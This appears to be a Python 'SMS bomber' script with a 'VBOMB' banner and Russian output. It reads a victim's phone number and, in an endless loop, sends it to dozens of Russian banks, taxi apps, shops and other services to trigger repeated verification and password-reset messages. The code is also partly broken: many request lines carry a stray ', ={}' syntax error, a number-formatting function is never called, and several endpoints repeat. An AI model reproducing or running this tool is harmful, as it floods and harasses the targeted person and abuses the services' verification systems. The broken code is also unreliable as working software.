import threading
import time
import requests, random, datetime, sys, time, argparse, os
print("""
██╗░░░██╗██████╗░░█████╗░███╗░░░███╗██████╗░
██║░░░██║██╔══██╗██╔══██╗████╗░████║██╔══██╗
╚██╗░██╔╝██████╦╝██║░░██║██╔████╔██║██████╦╝
░╚████╔╝░██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗
░░╚██╔╝░░██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝
░░░╚═╝░░░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░""")
phone = input("\033[32m Номер Бобика +")
def qw(_phone):
    if _phone[0] == '+':
        _phone = _phone[1:]
    if _phone[0] == '8':
        _phone = '7'+_phone[1:]
    if _phone[0] == '9':
        _phone = '7'+_phone
_phone = phone
_name = ''
for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
s = 0
iteration = 10
while True:
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        try: 
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Rutaxi вкинулся!") 
        except Exception as ex:  
            print("[-] Rutaxi откинулся!" + str(ex))
            
        try: 
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Tinkoff вкинулся!") 
        except Exception as ex:  
            print("[-] Tinkoff откинулся!" + str(ex))


        try: 
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': '+'+_phone}, headers={}) 
            print("[+] BelkaCar вкинулся!") 
        except Exception as ex:  
            print("[-] BelkaCar откинулся!" + str(ex))

        try: 
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Тиндер вкинулся!") 
        except Exception as ex:  
            print("[-] Тиндер откинулся!" + str(ex))


        try: 
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Карусель вкинулся!") 
        except Exception as ex:  
            print("[-] Карусель откинулся!" + str(ex))
       
        try: 
            requests.post('https://api.mtstv.ru/v1/users', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Mtstv вкинулся!") 
        except Exception as ex:  
            print("[-] Mtstv откинулся!" + str(ex))

        try: 
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Юла вкинулся!") 
        except Exception as ex:  
            print("[-] Юла откинулся!" + str(ex))

        try: 
            requests.post('https://pizzahut.ru/account/password-reset', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Пиццахут вкинулся!") 
        except Exception as ex:  
            print("[-] Пиццахут откинулся!" + str(ex))

        try: 
            requests.post('https://www.rabota.ru/remind', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Работа ру вкинулся!") 
        except Exception as ex:  
            print("[-] Работа ру откинулся!" + str(ex))


        try: 
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Рутуб вкинулся!") 
        except Exception as ex:  
            print("[-] Рутуб откинулся!" + str(ex))
        
        try: 
            requests.post('https://www.citilink.ru/registration/confirm/phone/+', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Стилинк вкинулся!") 
        except Exception as ex:  
            print("[-] Ситилинк откинулся!" + str(ex))
        
        try: 
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'phone': '+'+_phone}, headers={}) 
            print("[+] че то непонятное вкинулся!") 
        except Exception as ex:  
            print("[-] че то непонятное откинулся!" + str(ex))

        try: 
            requests.post('https://findclone.ru/register', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Финдклоун вкинулся!") 
        except Exception as ex:  
            print("[-] Финдклоун откинулся!" + str(ex))


        try: 
            requests.post('https://www.oyorooms.com/api/pwa/generateotp?phone=', data={'phone': '+'+_phone}, headers={}) 
            print("[+] oyorooms вкинулся!") 
        except Exception as ex:  
            print("[-] oyorooms откинулся!" + str(ex))

        try: 
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', data={'phone': '+'+_phone}, headers={}) 
            print("[+] Мвидео вкинулся!") 
        except Exception as ex:  
            print("[-] Мвидео откинулся!" + str(ex))


        try: 
            requests.post('https://newnext.ru/graphql', data={'phone': '+'+_phone}, headers={}) 
            print("[+] NewNext вкинулся!") 
        except Exception as ex:  
            print("[-] NewNext откинулся!" + str(ex))

        try: 
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': '+'+_phone}, ={}) 
            print("[+] Санлайт вкинулся!") 
        except Exception as ex:  
            print("[-] Санлайт откинулся!" + str(ex))
            
        try: 
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', data={'phone': '+'+_phone}, ={}) 
            print("[+] alpari вкинулся!") 
        except Exception as ex:  
            print("[-] alpari откинулся!" + str(ex))

        try: 
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': '+'+_phone}, ={}) 
            print("[+] invitro вкинулся!") 
        except Exception as ex:  
            print("[-] invitro откинулся!" + str(ex))

        try: 
            requests.post('https://online.sbis.ru/reg/service/', data={'phone': '+'+_phone}, ={}) 
            print("[+] onlinesbs вкинулся!") 
        except Exception as ex:  
            print("[-] onlinesbs откинулся!" + str(ex))


        try: 
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', data={'phone': '+'+_phone}, ={}) 
            print("[+] psnank вкинулся!") 
        except Exception as ex:  
            print("[-] psbank откинулся!" + str(ex))


        try: 
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': '+'+_phone}, ={}) 
            print("[+] beltelecom вкинулся!") 
        except Exception as ex:  
            print("[-] beltelecom откинулся!" + str(ex))


        try: 
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': '+'+_phone}, ={}) 
            print("[+] karusel вкинулся!") 
        except Exception as ex:  
            print("[-] karusel откинулся!" + str(ex))

        try: 
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={'phone': '+'+_phone}, ={}) 
            print("[+] kfc вкинулся!") 
        except Exception as ex:  
            print("[-] kfc откинулся!" + str(ex))

        try: 
            requests.post('https://api.carsmile.com/', data={'phone': '+'+_phone}, ={}) 
            print("[+] carsmile вкинулся!") 
        except Exception as ex:  
            print("[-] carsmine откинулся!" + str(ex))

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
        except:
            s=s

        try: 
            requests.post('https://www.citilink.ru/registration/confirm/phone/+', data={'phone': '+'+_phone}, ={}) 
            print("[+] citilink вкинулся!") 
        except Exception as ex:  
            print("[-] citilink откинулся!" + str(ex))

        try: 
            requests.post('https://findclone.ru/register', data={'phone': '+'+_phone}, ={}) 
            print("[+] findclone вкинулся!") 
        except Exception as ex:  
            print("[-] findclone откинулся!" + str(ex))

        try: 
            requests.post('https://guru.taxi/api/v1/driver/session/verify', data={'phone': '+'+_phone}, ={}) 
            print("[+] guru.taxi вкинулся!") 
        except Exception as ex:  
            print("[-] guru.taxi откинулся!" + str(ex))


        try: 
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={'phone': '+'+_phone}, ={}) 
            print("[+] icq вкинулся!") 
        except Exception as ex:  
            print("[-] icq откинулся!" + str(ex))

        try: 
            requests.post('https://terra-1.indriverapp.com/api/authorization?locale=ru', data={'phone': '+'+_phone}, ={}) 
            print("[+] indrive вкинулся!") 
        except Exception as ex:  
            print("[-] indrive откинулся!" + str(ex))

        try: 
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={'phone': '+'+_phone}, ={}) 
            print("[+] invitro вкинулся!") 
        except Exception as ex:  
            print("[-] invitto откинулся!" + str(ex))


        try: 
            requests.post('https://findclone.ru/register', data={'phone': '+'+_phone}, ={}) 
            print("[+] findclone вкинулся!") 
        except Exception as ex:  
            print("[-] findclone откинулся!" + str(ex))

        try: 
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', data={'phone': '+'+_phone}, ={}) 
            print("[+] pmsm вкинулся!") 
        except Exception as ex:  
            print("[-] pmsm откинулся!" + str(ex))

        try: 
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={'phone': '+'+_phone}, ={}) 
            print("[+] ivi вкинулся!") 
        except Exception as ex:  
            print("[-] ivi откинулся!" + str(ex))